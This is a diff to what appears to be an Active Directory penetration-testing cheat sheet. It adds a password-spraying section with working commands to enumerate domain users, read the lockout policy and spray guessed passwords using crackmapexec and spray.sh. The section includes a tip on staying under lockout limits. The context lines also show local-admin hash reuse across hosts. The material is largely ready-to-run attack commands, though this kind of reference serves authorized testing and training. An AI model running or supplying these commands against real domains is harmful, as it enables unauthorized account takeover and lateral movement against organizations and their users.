@@ -2,6 +2,7 @@
 * [Password not required](#Password-not-required)
 * [Password in description](#Password-in-description)
 * [Reuse local admin password](#Reuse-local-admin-password)
+* [Password spraying](#Password-spraying)
 * [Kerberoast](#Kerberoast) 
   * [Set SPN](#Set-SPN)
 * [AS-REP Roasting](#AS-REP-Roasting)
@@ -99,6 +100,36 @@ crackmapexec smb <HOST> -u <USER> -p <PASSWORD> -d <DOMAIN> --sam
 #### Reuse local administrator password against all other hosts
 ```
 crackmapexec smb hosts.txt -u administrator -H <HASH> -d .
+```
+
+## Password spraying
+#### Retrieve a list of usernames
+```
+crackmapexec ldap <DC IP> -u <USER> -p <PASSWORD> --users
+```
+
+```
+Get-DomainUser | Select-Object -expandproperty samaccountname
+```
+
+#### Retrieve the current password policy
+```
+crackmapexec smb -u <USER> -p <PASSWORD> --pass-pol
+```
+
+```
+Get-DomainPolicyData
+```
+
+#### Spray easy guessable passwords against all these users
+- Make sure to keep enough login attempts for the user!
+- https://github.com/Greenwolf/Spray
+```
+crackmapexec smb <DC IP> -u <USER FILE> -p <PASSWORD FILE> --continue-on-success
+```
+
+```
+spray.sh -smb <DC IP> <USER FILE> <PASSWORD FILE> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
 ```
 
 ## Kerberoast
